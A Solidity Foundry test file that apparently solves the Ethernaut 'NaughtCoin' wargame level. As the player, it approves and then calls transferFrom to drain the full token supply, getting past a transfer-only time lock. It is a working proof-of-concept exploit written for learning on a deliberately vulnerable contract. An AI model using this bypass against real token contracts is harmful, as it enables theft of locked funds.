// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {NaughtCoin} from "../src/NaughtCoin.sol";

contract NaughtCoinTest is Test {
    NaughtCoin public victim;
    address public player;

    function setUp() public {
        player = makeAddr("player");
        victim = new NaughtCoin(player);
    }

    function test_attack() public {
        vm.startPrank(player);
        victim.approve(address(this), victim.INITIAL_SUPPLY());
        vm.stopPrank();
        victim.transferFrom(player, address(this), victim.INITIAL_SUPPLY());

        assertEq(victim.balanceOf(player), 0, "Player should have 0 balance");
        assertEq(victim.balanceOf(address(this)), victim.INITIAL_SUPPLY(), "Attacker should have the initial supply");
    }
}
